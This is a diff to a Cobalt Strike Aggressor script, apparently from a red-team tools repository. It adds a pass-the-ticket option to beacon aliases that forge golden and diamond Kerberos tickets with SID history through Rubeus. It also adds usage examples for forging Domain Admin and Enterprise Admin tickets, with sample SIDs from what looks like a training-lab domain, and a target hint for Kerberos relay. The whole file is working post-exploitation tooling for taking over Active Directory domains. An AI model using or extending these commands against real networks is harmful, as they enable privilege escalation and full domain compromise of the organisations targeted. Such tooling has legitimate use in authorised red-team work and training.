@@ -1,6 +1,4 @@
-# $1 is beacon id
-# $2 target
-# $3 selected listener
+#SOURCE:https://github.com/blaisebits/CobaltStrikeTools
 
 #GLOBAL VARIABLES
 $SHARPWMI_BIN_PATH  = getFileProper("C:\\Tools\\SharpWMI\\SharpWMI\\bin\\Release","SharpWMI.exe");
@@ -1791,7 +1789,8 @@ beacon_command_register(
     "Stand up Kerberos Relay\n\n"
     . "Usage:\n"
     . "krbrelay_up rbcd [target spn] [Fake machine SID] [port]\n"
-    . "krbrelay_up sc [target spn] [port]"
+    . "krbrelay_up sc [target spn] [port]\n\n"
+    . "Target SPN will likely be 'ldap/dc.domain.local'"
 )
 alias webdav_check{
     local('$file $handle $data $args');
@@ -1886,12 +1885,13 @@ beacon_command_register (
 alias trust_goldenticket {
     $size = size(@_);
     #[domain] [user] [Domain SID] [hashType:hash]
-    if ($size == 6) {
+    if ($size >= 6) {
         $domain     = @_[1];
         $user       = @_[2];
         $domainsid  = @_[3];
         $historysid = @_[4];
         $hash       = @_[5];
+        $ptt        = @_[6];
 
         $parameters = "golden"
         . " /user:" . $user
@@ -1900,6 +1900,8 @@ alias trust_goldenticket {
         . " /sids:" . $historysid
         . " /" . $hash
         . " /nowrap";
+
+        if ($ptt ismatch 'ptt') { $parameters = $parameters . ' /ptt'; }
     } else {
         berror($1, "Invalid Parameters");
         return;
@@ -1910,17 +1912,20 @@ beacon_command_register(
     "trust_goldenticket",
     "Use Rubeus to forge a golden TGT w/ SID History",
     "Use Rubeus to forge a golden TGT w/ SID History\n\n"
-    . "Usage: trust_goldenticket [domain] [user] [domain SID] [history SID] [hashType:hash]\n"
-    . "  hashType = [des|rc4|aes128|aes256]"
+    . "Usage: trust_goldenticket [domain] [user] [domain SID] [history SID] [hashType:hash] (ptt)\n"
+    . "  hashType = [des|rc4|aes128|aes256]\n\n"
+    . "Domain Admin Example:\n"
+    . "trust_goldenticket dev.cyberbotic.io Administrator S-1-5-21-569305411-121244042-2357301523 S-1-5-21-2594061375-675613155-814674916-512 <key>"
 )
 alias trust_diamondticket {
     $size = size(@_);
-    if ($size == 6) {
+    if ($size >= 6) {
         $username   = @_[1];
         $userrid    = @_[2];
         $groups     = @_[3];
         $historysid = @_[4];
         $hash       = @_[5];
+        $ptt        = @_[6];
 
         $parameters = "diamond /tgtdeleg"
         . " /ticketuser:" . $username
@@ -1928,7 +1933,9 @@ alias trust_diamondticket {
         . " /groups:" . $groups
         . " /sids:" . $historysid
         . " /krbkey:" . $hash
-        . " /nowrap"
+        . " /nowrap";
+
+        if ($ptt ismatch 'ptt') { $parameters = $parameters . ' /ptt'; }
     } else {
         berror($1, "Invalid Parameters");
         return;
@@ -1937,10 +1944,10 @@ alias trust_diamondticket {
 }
 beacon_command_register(
     "trust_diamondticket",
-    "Use Rubeus to forge a golden TGT",
-    "Use Rubeus to forge a golden TGT\n\n"
+    "Use Rubeus to forge a diamond TGT",
+    "Use Rubeus to forge a diamond TGT\n\n"
     . "Usage:\n"
-    . "trust_diamondticket [ticket user] [ticket user RID] [groupscsv] [history SID] [krbkey(aes256)]\n\n"
+    . "trust_diamondticket [ticket user] [ticket user RID] [groupscsv] [history SID] [krbkey(aes256)] (ptt)\n\n"
     . "Enternprise Admin Example:\n"
     . "Administrator 500 519 S-1-5-21-2594061375-675613155-814674916-519 <key>\n"
 )
